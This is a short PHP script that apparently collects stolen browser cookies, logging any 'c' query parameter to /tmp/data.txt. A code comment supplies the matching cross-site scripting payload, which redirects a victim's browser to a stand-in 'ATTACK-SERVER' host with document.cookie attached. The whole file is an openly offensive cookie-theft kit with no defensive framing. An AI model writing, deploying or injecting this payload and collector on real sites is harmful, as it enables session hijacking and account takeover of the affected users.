<?php

/*
Collects data and save them to /tmp/data.txt


XSS example:
<script type="text/javascript">
document.location='http://ATTACK-SERVER/x.php?c='+document.cookie;
</script>
*/

if(!empty($_GET['c'])) {
    $logfile = fopen('/tmp/data.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}

?>
